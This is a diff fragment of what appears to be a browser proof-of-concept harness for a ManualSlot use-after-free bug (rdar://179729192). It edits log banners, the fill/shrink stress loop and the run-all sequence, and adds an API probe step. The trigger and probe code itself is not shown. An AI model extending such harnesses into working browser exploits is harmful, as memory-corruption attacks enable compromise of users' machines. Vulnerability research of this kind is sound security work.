 // ─────────────────────────────────────────────────────────────────────────────
-// LOOP ×200 — best config from path D / A sweep
+// LOOP ×200 — stress best config
+// FIX v99: spread in probePathA
 // ─────────────────────────────────────────────────────────────────────────────
 async function runLoop(){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  LOOP ×200 · ManualSlot fill+shrink stress                   ║','hi');
+  log('║  LOOP ×200 · fill=33 keep=0 (cap=64 → 0% load → shrink)    ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-  log('  Testing fill=33 keep=0 direct (best shrink-trigger config)','inf');
   log('');
 
   let ok=0, hit=0;
@@ -696,8 +694,12 @@ async function runAll(){
   _inRunAll = true;
   dis(true); L.innerHTML=''; uafTotal=0;
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  v98 RUN ALL · ManualSlot WeakHashMap UAF rdar://179729192   ║','hi');
+  log('║  v99 RUN ALL · ManualSlot UAF rdar://179729192               ║','hi');
+  log('║  FIX: slot.assign() now uses spread syntax correctly         ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('');
+  log('━━━━━━━━━━━━ API PROBE ━━━━━━━━━━━━','hi');
+  await runAPIProbe();
   log('');
   log('━━━━━━━━━━━━ PATH-A ━━━━━━━━━━━━','hi');
   await runPathA();
@@ -719,7 +721,6 @@ async function runAll(){
   log(`══════════════════════════════════════════════════════════════`,'hi');
   _inRunAll = false;
   dis(false);
-  // auto-copy the full unified log
   copyLog();
 }
 </script>
